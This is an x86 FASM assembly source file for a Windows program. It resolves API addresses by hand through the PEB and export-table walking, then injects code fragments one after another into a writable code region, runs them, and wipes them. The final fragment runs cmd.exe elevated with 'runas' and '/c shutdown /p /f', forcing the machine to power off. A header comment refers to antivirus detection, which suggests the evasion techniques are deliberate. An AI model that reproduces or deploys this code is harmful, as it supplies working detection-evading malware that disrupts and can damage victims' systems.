;
;      ANTIVIRUS DETECTS
;          4B4DB4B3
;

format PE CONSOLE
entry start

section '.data' data readable writeable
        LoadLib db 'LoadLibraryA', 0
        LoadLibrary dd ?
        GetProcAddress dd ?

        ExitProc db 'ExitProcess', 0
        ExitProcess dd ?

        lib1 db 'shell32.dll'
        shell32 dd ?

        ShellExecute db 'ShellExecuteA'
        ShellExec dd ?

        open db 'runas', 0
        params db '/c shutdown /p /f', 0
        cmd db 'C:\\Windows\\System32\\cmd.exe', 0

        clear_code: db code1.size dup(0x00)
        clear_code.size = $ - clear_code

section '.text' code writeable readable executable
        code1:  push 0
                push 0
                push params
                push cmd
                push open
                push 0
                call [ShellExec]

                ret
        code1.size = $ - code1

        code3:  push lib1
                call [LoadLibrary]
                mov [shell32], eax

                ret
        code3.size = $ - code3

        code2:  push ShellExecute
                push [shell32]
                call [GetProcAddress]
                mov [ShellExec], eax

                ret
        code2.size = $ - code2

        inject: mov eax, [esp + 8]
                mov ebx, [esp + 4]

                mov esi, eax
                mov edi, start2
                mov ecx, ebx
                rep movsb

                ret

        clear:  mov esi, clear_code
                mov edi, start2
                mov ecx, clear_code.size
                rep movsb

                ret

        start:  mov eax, [fs:0x30]
                mov eax, [eax + 0x00c]
                mov eax, [eax + 0x014]
                mov eax, [eax + 0x00]
                mov eax, [eax + 0x00]
                mov ebx, [eax + 0x10]

                mov edx, [ebx + 0x3c]
                add edx, ebx
                mov edx, [edx + 0x78]
                add edx, ebx
                mov esi, [edx + 0x20]
                add esi, ebx
                xor ecx, ecx

        procAddr:
                inc ecx
                lodsd
                add eax, ebx
                cmp dword[eax], 0x50746547
                jnz procAddr
                cmp dword[eax + 0x4], 0x41636F72
                jnz procAddr
                cmp dword[eax + 0x8], 0x65726464
                jnz procAddr

        procAddrFunc:
                mov esi, [edx + 0x24]
                add esi, ebx
                mov cx, [esi + ecx * 2]
                dec ecx
                mov esi, [edx + 0x1c]
                add esi, ebx
                mov edx, [esi + ecx * 4]
                add edx, ebx
                mov [GetProcAddress], edx



                push LoadLib
                push ebx
                call [GetProcAddress]
                mov [LoadLibrary], eax


                push ExitProc
                push ebx
                call [GetProcAddress]
                mov [ExitProcess], eax



                push code3
                push code3.size
                call inject

                call start2

                call clear

                push code2
                push code2.size
                call inject

                call start2
                call clear

                push code1
                push code1.size
                call inject

                call start2

                call clear

        exit:

                push 0
                call [ExitProcess]

        fast_exit:
                ret

        start2:
